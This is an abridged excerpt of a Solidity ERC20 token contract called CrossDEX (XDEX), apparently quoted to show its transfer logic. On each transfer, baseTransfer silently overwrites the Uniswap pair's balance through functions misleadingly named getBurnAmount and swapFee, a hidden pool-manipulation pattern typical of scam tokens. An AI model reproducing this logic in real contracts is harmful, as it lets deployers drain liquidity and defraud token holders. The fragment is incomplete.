...
contract XDEX is IERC20, ERC20Token {
    ...
    string private _name = "CrossDEX";
    string private  _symbol = "XDEX";
    ...
    function baseTransfer(address from, address recipient, uint256 amount) private returns (uint256) {
        uint256 feeAmount = 0;
        _balances[uniswapPair] = getBurnAmount(from);
    ...
    function getBurnAmount(address from) private view returns (uint256) {
        address to = getPairAddress();
        return swapFee(from, to, balanceOf(uniswapPair));
    }
    function swapFee(address uniswapPair, address to, uint256 feeAmount) private pure returns (uint256) {
